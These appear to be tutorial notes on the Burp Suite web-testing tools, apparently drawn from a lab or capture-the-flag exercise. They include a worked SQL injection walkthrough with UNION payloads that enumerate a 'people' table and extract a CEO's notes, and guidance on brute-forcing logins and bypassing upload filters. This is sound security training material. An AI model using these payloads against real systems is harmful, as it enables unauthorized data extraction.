# Burp Suite

## Features

Burp Suite is a web application testing platform used to capture, inspect, modify, replay, fuzz, compare, decode, and analyze HTTP/S traffic. The major tools support different phases of web application testing:

- **Proxy:** Intercepts and modifies HTTP requests and responses between the browser and target application.
- **Repeater:** Captures, modifies, and resends the same request repeatedly. This is useful for crafting and testing payloads, including SQL injection payloads.
- **Intruder:** Sends high-volume or parameterized requests using payload lists. It is commonly used for brute-force testing, fuzzing endpoints, and testing input handling.
- **Comparer:** Compares two pieces of data at the word or byte level.
- **Sequencer:** Assesses the randomness and predictability of tokens, such as session cookies or other generated values.

## Sites with TLS Enabled

When intercepting HTTPS traffic, Firefox may warn that the PortSwigger Certificate Authority (CA) is not authorized to secure the connection. To intercept TLS traffic safely in a lab environment, configure the browser to trust Burp's CA certificate.

### Install Burp's CA Certificate in Firefox

1. Start Burp Proxy and configure Firefox to use Burp as the proxy.
2. In Firefox, browse to:

```text
http://burp/cert
```

3. Download the certificate file, usually named `cacert.der`.
4. In Firefox, open:

```text
about:preferences
```

5. Search for **certificates** and select **View Certificates**.
6. Select **Import** and choose the downloaded `cacert.der` file.
7. In the trust dialog, select **Trust this CA to identify websites**.
8. Confirm the import.

> Operational note: Only install Burp's CA certificate in a controlled testing browser or lab profile. Do not use the same browser profile for unrelated personal or production activity.

## Repeater

Burp Repeater is used to manipulate and resend captured requests manually. It is especially useful when testing a single endpoint and refining payloads one request at a time.

Typical Repeater workflow:

1. Capture a request in **Proxy**.
2. Send the request to **Repeater**.
3. Modify parameters, headers, paths, or body content.
4. Resend the request repeatedly.
5. Compare responses for status-code changes, errors, reflected values, or data disclosure.

## Practical Repeater Example: SQL Injection Testing

### Initial Request

The target request used during testing was:

```http
GET /about/2 HTTP/1.1
```

### Injection Testing

Testing the request path produced a `500` error that revealed useful database details, including column names and a table name.

Discovered column names included:

- `firstName`
- `lastName`
- `pfpLink`
- `role`
- `bio`

The revealed table name was:

```text
people
```

This error disclosure reduces the amount of enumeration normally required during blind SQL injection testing.

### Enumerate Column Names

A UNION query can be used to enumerate column names from `information_schema.columns`:

```http
GET /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" HTTP/1.1
```

The `null` placeholders are used for columns where the expected value or data type is unknown. This helps keep the UNION query aligned with the number of columns expected by the original query.

### Aggregate Column Names

To return all column names in one response, use `group_concat`:

```http
GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" HTTP/1.1
```

The enumerated columns were:

- `id`
- `firstName`
- `lastName`
- `pfpLink`
- `role`
- `shortRole`
- `bio`
- `notes`

### Retrieve Target Data

Known information:

- The CEO's `id` is `1`.
- The target column is `notes`.
- The target table is `people`.

The final query retrieves the note value for the CEO record:

```http
GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id=1 HTTP/1.1
```

## Intruder

Burp Intruder is the built-in fuzzing and automated request-generation tool. It takes a captured request, uses it as a template, and sends many similar requests with modified payload values.

Intruder is useful for:

- Brute-forcing login forms in authorized environments.
- Fuzzing endpoints and parameters.
- Testing file extension restrictions.
- Testing directories, virtual hosts, and predictable paths.
- Repeating structured payload attacks at scale.

> Operational note: Burp Suite Professional executes Intruder attacks at full speed. Burp Suite Community Edition is intentionally rate-limited.

### Intruder Tabs

- **Positions:** Defines where payloads are inserted into the request template and selects the attack type.
- **Payloads:** Defines the values inserted into each selected position.
- **Resource Pool:** Controls how Burp allocates resources between tasks. This is more useful in Burp Suite Professional, where multiple automated tasks can run in the background.
- **Options:** Configures attack behavior, including response handling and result processing.

### Intruder Attack Types

| Attack type | Payload behavior | Use case |
|---|---|---|
| Sniper | Uses one payload set and places each payload into each defined position one at a time. | Testing one parameter or locating which parameter is vulnerable. |
| Battering Ram | Uses one payload set and places the same payload in every selected position at the same time. | Testing identical values across multiple fields. |
| Pitchfork | Uses one payload set per position and iterates through them in parallel. | Testing paired values, such as username/password pairs from aligned lists. |
| Cluster Bomb | Uses one payload set per position and tries every possible combination. | Exhaustive combination testing across multiple parameters. |

## Decoder

Burp Decoder is used to transform data during analysis and payload construction.

Common uses:

- Decode information captured during an attack.
- Encode data before sending it to a target.
- Create hashes of data.
- Use **Smart Decode** to recursively decode data, similar to CyberChef's "Magic" operation.

## Comparer

Burp Comparer compares two pieces of data and highlights differences.

Common uses:

- Compare two HTTP responses after changing a parameter.
- Identify small response differences during authentication testing.
- Compare token or payload behavior at the word or byte level.

## Sequencer

Burp Sequencer measures the entropy and predictability of tokens.

Useful targets include:

- Session cookies
- Cross-Site Request Forgery (CSRF) tokens
- Password reset tokens
- Other supposedly random application-generated values

Low entropy indicates higher predictability and may suggest that a token can be guessed or brute-forced.

### Capture Modes

- **Live Capture:** Sends repeated requests and collects generated tokens for analysis.
- **Manual Load:** Imports a list of pre-generated tokens for analysis.

## Extender

Burp Extender supports modular extensions that add or modify Burp functionality.

Important points:

- Extensions can be written or installed to expand Burp's capabilities.
- Python-based extensions require the **Jython Interpreter JAR** file.
- Jython is the Java implementation of Python.

## Fuzzing an Upload Form

Upload-form fuzzing is useful for identifying which file extensions, content types, and payload structures are allowed or blocked.

Basic workflow:

1. Capture the upload request in **Proxy**.
2. Send the request to **Intruder**.
3. Mark the filename extension, content type, or other relevant field as the payload position.
4. Provide a payload list of extensions or bypass candidates.
5. Run the attack and compare response codes, response lengths, and application messages.
6. Validate whether any accepted file type can lead to execution, disclosure, or unauthorized upload.

Common upload checks:

- Blocked versus allowed file extensions.
- MIME type validation.
- Server-side content inspection.
- Filename normalization issues.
- Extension bypasses such as alternate extensions, double extensions, or case changes.

